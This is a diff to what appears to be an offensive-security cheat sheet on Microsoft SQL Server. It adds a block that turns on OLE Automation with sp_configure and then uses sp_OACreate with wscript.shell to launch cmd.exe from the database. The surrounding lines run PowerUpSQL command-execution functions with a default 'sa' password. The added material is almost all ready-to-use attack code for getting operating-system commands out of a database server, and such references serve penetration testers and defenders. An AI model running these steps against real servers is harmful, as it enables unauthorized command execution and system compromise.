@@ -234,6 +234,19 @@ Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\
 Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "whoami" Verbose
 ```
 
+```ps1
+# Enable OLE Automation
+EXEC sp_configure 'show advanced options', 1
+EXEC sp_configure reconfigure
+EXEC sp_configure 'OLE Automation Procedures', 1
+EXEC sp_configure reconfigure
+
+# Execute commands
+DECLARE @execmd INT
+EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
+EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'
+```
+
 ## Agent Jobs
 
 ### Execute commands through SQL Agent Job service
